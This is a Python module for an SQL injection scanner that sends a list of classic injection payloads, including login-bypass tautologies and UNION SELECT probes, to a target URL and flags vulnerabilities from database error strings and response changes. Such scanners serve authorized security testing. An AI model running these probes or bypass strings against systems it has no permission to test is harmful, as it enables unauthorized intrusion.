"""
Payload Tester Module - SQL Injection Vulnerability Scanner
⚠️ EDUCATIONAL USE ONLY - Authorized Testing Only

Safe, non-destructive SQL injection testing using read-only payloads
"""

import httpx
import asyncio
from typing import Dict, List
from urllib.parse import urljoin, quote


class PayloadTester:
    """SQL injection payload tester"""
    
    def __init__(self, url: str):
        self.url = url
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        # Safe, read-only SQL injection payloads
        self.payloads = [
            "'",
            '"',
            "`",
            "´",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "admin'--",
            "1' OR '1'='1'--",
            "1\" OR \"1\"=\"1\"--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "-1 OR 1=1",
            "' OR 'x'='x",
            "\" OR \"x\"=\"x",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR 1=1--",
            "\" OR 1=1--",
            "OR 1=1",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            "') OR ('a'='a",
            "1' AND '1'='1",
            "1\" AND \"1\"=\"1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "admin' #",
            "admin'/*",
            "' or 1=1 limit 1 -- -+",
            "' OR '1",
        ]
        
        # SQL error patterns to detect
        self.error_patterns = [
            "sql syntax",
            "mysql_fetch",
            "warning: mysql",
            "you have an error in your sql syntax",
            "odbc",
            "sql error",
            "pdo",
            "oracle error",
            "sqlite error",
            "postgresql",
            "pg_query",
            "syntax error",
            "unclosed quotation",
            "quoted string not properly terminated",
            "database error",
            "mysql_num_rows",
            "mysql_query",
            "mysqli",
            "sqlstate",
            "syntax error or access violation",
            "invalid query",
            "mysql server version",
            "microsoft ole db provider",
            "jdbc",
            "ora-",
            "db2",
            "sybase",
        ]
    
    async def get_baseline(self) -> Dict:
        """Get baseline response for comparison"""
        try:
            async with httpx.AsyncClient(follow_redirects=True, timeout=10) as client:
                response = await client.get(
                    self.url,
                    headers={'User-Agent': self.user_agent}
                )
                
                return {
                    'status': response.status_code,
                    'content': response.text,
                    'length': len(response.text)
                }
        except Exception as e:
            return {
                'status': 0,
                'content': '',
                'length': 0,
                'error': str(e)
            }
    
    async def test_payload(self, payload: str, baseline: Dict) -> Dict:
        """Test a single payload"""
        try:
            # Add payload as GET parameter
            test_url = f"{self.url}{'&' if '?' in self.url else '?'}v={quote(payload)}"
            
            async with httpx.AsyncClient(follow_redirects=True, timeout=10) as client:
                response = await client.get(
                    test_url,
                    headers={'User-Agent': self.user_agent}
                )
                
                status = response.status_code
                content = response.text.lower()
                length = len(response.text)
                
                # Check for SQL errors
                for error_pattern in self.error_patterns:
                    if error_pattern in content:
                        return {
                            'vulnerable': True,
                            'payload': payload,
                            'reason': f'SQL error detected: {error_pattern}',
                            'status': status
                        }
                
                # Check for status code anomaly
                if baseline.get('status') == 200 and status == 500:
                    return {
                        'vulnerable': True,
                        'payload': payload,
                        'reason': 'Status code changed to 500 (server error)',
                        'status': status
                    }
                
                # Check for significant content length change
                baseline_length = baseline.get('length', 0)
                if baseline_length > 0:
                    length_diff = abs(length - baseline_length)
                    if length_diff > baseline_length * 0.3:  # 30% difference
                        return {
                            'vulnerable': True,
                            'payload': payload,
                            'reason': f'Content length changed significantly ({baseline_length} → {length})',
                            'status': status
                        }
                
                return {
                    'vulnerable': False,
                    'payload': payload,
                    'status': status
                }
        
        except Exception as e:
            return {
                'vulnerable': False,
                'payload': payload,
                'error': str(e)
            }
    
    async def test_all_payloads(self, progress_callback=None) -> Dict:
        """Test all payloads and return results"""
        results = {
            'url': self.url,
            'vulnerable': False,
            'hits': [],
            'total_payloads': len(self.payloads),
            'tested': 0
        }
        
        try:
            # Get baseline
            if progress_callback:
                await progress_callback("Getting baseline response...")
            
            baseline = await self.get_baseline()
            
            if 'error' in baseline:
                return {
                    'status': 'error',
                    'message': f"Failed to connect to target: {baseline['error']}"
                }
            
            # Test each payload
            for i, payload in enumerate(self.payloads, 1):
                if progress_callback:
                    await progress_callback(f"Testing payload {i}/{len(self.payloads)}...")
                
                result = await self.test_payload(payload, baseline)
                results['tested'] = i
                
                if result.get('vulnerable'):
                    results['vulnerable'] = True
                    results['hits'].append({
                        'payload': result['payload'],
                        'reason': result['reason']
                    })
                
                # Small delay to avoid overwhelming the server
                await asyncio.sleep(0.2)
            
            return {
                'status': 'success',
                'results': results
            }
        
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }


async def test_payloads(url: str, progress_callback=None) -> Dict:
    """
    Test URL for SQL injection vulnerabilities using safe payloads
    
    Args:
        url: Target URL to test
        progress_callback: Optional async callback for progress updates
    
    Returns:
        Dict with status, results, vulnerable flag, and hits
    """
    tester = PayloadTester(url)
    return await tester.test_all_payloads(progress_callback)
